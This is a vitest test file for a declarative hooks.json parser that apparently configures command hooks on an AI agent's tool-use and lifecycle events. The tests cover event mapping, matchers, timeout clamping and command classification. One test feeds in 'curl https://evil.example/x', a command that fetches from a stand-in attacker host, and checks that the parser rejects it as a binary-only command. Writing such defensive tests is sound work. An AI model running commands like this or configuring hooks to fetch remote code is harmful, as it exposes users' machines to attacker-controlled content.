/**
 * Tests for the declarative `hooks.json` parser (#811 command-hooks milestone).
 *
 * Spec ref: docs/architecture/hook-runtime-expansion-design.md §4. Covers the
 * decisions: glob matcher (string-validated), closed event set, command-type
 * handler with local-script-vs-binary classification + binary-only rejection,
 * and timeoutMs clamp.
 */
import { describe, expect, it } from "vitest";
import {
  classifyCommand,
  looksLikeLocalScriptPath,
  parseHookConfig,
} from "../hook-config.js";
import { DEFAULT_HOOK_TIMEOUT_MS } from "../script-hook-types.js";

describe("parseHookConfig — empty / missing", () => {
  it("returns empty entries for undefined / null / non-object", () => {
    for (const raw of [undefined, null]) {
      const r = parseHookConfig(raw);
      expect(r.entries).toEqual([]);
      expect(r.errors).toEqual([]);
    }
    const r = parseHookConfig(42);
    expect(r.entries).toEqual([]);
    expect(r.warnings.length).toBeGreaterThan(0);
  });

  it("treats a config with no hooks key as a valid empty config", () => {
    const r = parseHookConfig({ version: 1 });
    expect(r.entries).toEqual([]);
    expect(r.warnings).toEqual([]);
    expect(r.errors).toEqual([]);
  });

  it("warns when hooks is not an object", () => {
    const r = parseHookConfig({ version: 1, hooks: [] });
    expect(r.entries).toEqual([]);
    expect(r.warnings.length).toBe(1);
  });
});

describe("parseHookConfig — valid parse", () => {
  it("parses a well-formed command hook with a local-script command", () => {
    const r = parseHookConfig({
      version: 1,
      hooks: {
        PreToolUse: [
          {
            matcher: "mcp__*",
            hooks: [
              {
                type: "command",
                command: "~/.config/lvis/hooks/pre_policy.py",
                timeoutMs: 3000,
              },
            ],
          },
        ],
      },
    });
    expect(r.errors).toEqual([]);
    expect(r.warnings).toEqual([]);
    expect(r.entries).toHaveLength(1);
    expect(r.entries[0]).toMatchObject({
      event: "pre",
      matcher: "mcp__*",
      command: ["~/.config/lvis/hooks/pre_policy.py"],
      timeoutMs: 3000,
      source: "config",
    });
    expect(r.entries[0].id).toContain("PreToolUse");
  });

  it("accepts an argv-array command and preserves order", () => {
    const r = parseHookConfig({
      hooks: {
        PostToolUse: [
          {
            hooks: [
              { type: "command", command: ["python3", "./hooks/audit.py", "--strict"] },
            ],
          },
        ],
      },
    });
    expect(r.errors).toEqual([]);
    expect(r.entries[0].command).toEqual(["python3", "./hooks/audit.py", "--strict"]);
    expect(r.entries[0].event).toBe("post");
  });

  it("maps all three closed event keys", () => {
    const mk = (cmd: string) => ({
      hooks: [{ type: "command", command: cmd }],
    });
    const r = parseHookConfig({
      hooks: {
        PreToolUse: [mk("./a.sh")],
        PostToolUse: [mk("./b.sh")],
        PermissionRequest: [mk("./c.sh")],
      },
    });
    expect(r.errors).toEqual([]);
    expect(r.entries.map((e) => e.event).sort()).toEqual(["perm", "post", "pre"]);
  });

  it("treats matcher '*' and '' as match-all (undefined matcher)", () => {
    const r = parseHookConfig({
      hooks: {
        PreToolUse: [
          { matcher: "*", hooks: [{ type: "command", command: "./a.sh" }] },
          { matcher: "  ", hooks: [{ type: "command", command: "./b.sh" }] },
        ],
      },
    });
    expect(r.errors).toEqual([]);
    expect(r.entries).toHaveLength(2);
    expect(r.entries[0].matcher).toBeUndefined();
    expect(r.entries[1].matcher).toBeUndefined();
  });
});

describe("parseHookConfig — unknown event ignored + warned (decision b)", () => {
  it("ignores an unknown event key and emits a warning", () => {
    const r = parseHookConfig({
      hooks: {
        // A genuinely unknown key (NOT one of the closed-set lifecycle events).
        TotallyUnknownEvent: [{ hooks: [{ type: "command", command: "./x.sh" }] }],
        PreToolUse: [{ hooks: [{ type: "command", command: "./pre.sh" }] }],
      },
    });
    // Only the known PreToolUse entry survives.
    expect(r.entries).toHaveLength(1);
    expect(r.entries[0].event).toBe("pre");
    expect(r.warnings.some((w) => w.includes("TotallyUnknownEvent"))).toBe(true);
    // Never silently active.
    expect(r.entries.some((e) => e.command[0] === "./x.sh")).toBe(false);
  });
});

// #811 milestone-2 — the six non-blocking lifecycle events are now a recognized
// part of the closed event-key set (config-only; no `.sh` prefix).
describe("parseHookConfig — lifecycle event keys recognized (#811 m2)", () => {
  it.each([
    ["PostToolUseFailure"],
    ["PermissionDenied"],
    ["SessionStart"],
    ["Stop"],
    ["PreCompact"],
    ["PostCompact"],
    ["SubagentStart"],
    ["SubagentStop"],
  ])("maps lifecycle event %s to itself with no warning", (eventKey) => {
    const r = parseHookConfig({
      hooks: {
        [eventKey]: [{ hooks: [{ type: "command", command: "./life.sh" }] }],
      },
    });
    expect(r.errors).toEqual([]);
    expect(r.entries).toHaveLength(1);
    // Lifecycle events map to themselves (not the pre|post|perm projection).
    expect(r.entries[0].event).toBe(eventKey);
    // Recognized ⇒ not warned as unknown.
    expect(r.warnings.some((w) => w.includes("unknown event"))).toBe(false);
  });
});

describe("parseHookConfig — binary-only command rejected (decision c)", () => {
  it("rejects a PATH-binary with no local script argument", () => {
    const r = parseHookConfig({
      hooks: {
        PreToolUse: [
          { hooks: [{ type: "command", command: "curl https://evil.example/x" }] },
        ],
      },
    });
    expect(r.entries).toHaveLength(0);
    expect(r.errors).toHaveLength(1);
    expect(r.errors[0]).toContain("PATH-binary");
  });

  it("accepts a PATH-binary that references a local script argument", () => {
    const r = parseHookConfig({
      hooks: {
        PreToolUse: [
          {
            hooks: [
              { type: "command", command: "python3 ~/.config/lvis/hooks/p.py" },
            ],
          },
        ],
      },
    });
    expect(r.errors).toEqual([]);
    expect(r.entries).toHaveLength(1);
    expect(r.entries[0].command).toEqual(["python3", "~/.config/lvis/hooks/p.py"]);
  });

  it("rejects a non-command handler type", () => {
    const r = parseHookConfig({
      hooks: {
        PreToolUse: [{ hooks: [{ type: "http", url: "https://x" }] }],
      },
    });
    expect(r.entries).toHaveLength(0);
    expect(r.errors[0]).toContain("command");
  });

  it("rejects a handler with an empty / missing command", () => {
    const r = parseHookConfig({
      hooks: {
        PreToolUse: [{ hooks: [{ type: "command", command: "   " }] }],
      },
    });
    expect(r.entries).toHaveLength(0);
    expect(r.errors).toHaveLength(1);
  });
});

describe("parseHookConfig — timeoutMs clamp (decision d)", () => {
  it("clamps a too-large timeout down to the ceiling", () => {
    const r = parseHookConfig({
      hooks: {
        PreToolUse: [
          {
            hooks: [
              {
                type: "command",
                command: "./a.sh",
                timeoutMs: DEFAULT_HOOK_TIMEOUT_MS + 999_999,
              },
            ],
          },
        ],
      },
    });
    expect(r.entries[0].timeoutMs).toBe(DEFAULT_HOOK_TIMEOUT_MS);
  });

  it("keeps an in-range timeout as-is", () => {
    const r = parseHookConfig({
      hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "./a.sh", timeoutMs: 1234 }] }] },
    });
    expect(r.entries[0].timeoutMs).toBe(1234);
  });

  it("defaults a missing / invalid / non-positive timeout to the ceiling", () => {
    const cases = [
      undefined,
      "5000",
      0,
      -1,
      Number.POSITIVE_INFINITY,
      Number.NaN,
    ];
    for (const t of cases) {
      const handler: Record<string, unknown> = { type: "command", command: "./a.sh" };
      if (t !== undefined) handler.timeoutMs = t;
      const r = parseHookConfig({ hooks: { PreToolUse: [{ hooks: [handler] }] } });
      expect(r.entries[0].timeoutMs).toBe(DEFAULT_HOOK_TIMEOUT_MS);
    }
  });
});

describe("command classification helpers", () => {
  it("looksLikeLocalScriptPath distinguishes paths from bare binaries", () => {
    expect(looksLikeLocalScriptPath("./a.sh")).toBe(true);
    expect(looksLikeLocalScriptPath("../x/y.py")).toBe(true);
    expect(looksLikeLocalScriptPath("/abs/path.sh")).toBe(true);
    expect(looksLikeLocalScriptPath("~/.config/lvis/hooks/p.py")).toBe(true);
    expect(looksLikeLocalScriptPath("dir/file")).toBe(true);
    expect(looksLikeLocalScriptPath("python3")).toBe(false);
    expect(looksLikeLocalScriptPath("curl")).toBe(false);
    expect(looksLikeLocalScriptPath("")).toBe(false);
  });

  it("classifyCommand labels the three cases", () => {
    expect(classifyCommand(["./a.sh"])).toBe("local-script");
    expect(classifyCommand(["python3", "./p.py"])).toBe("script-arg");
    expect(classifyCommand(["curl", "https://x"])).toBe("binary-only");
    expect(classifyCommand(["node"])).toBe("binary-only");
  });
});
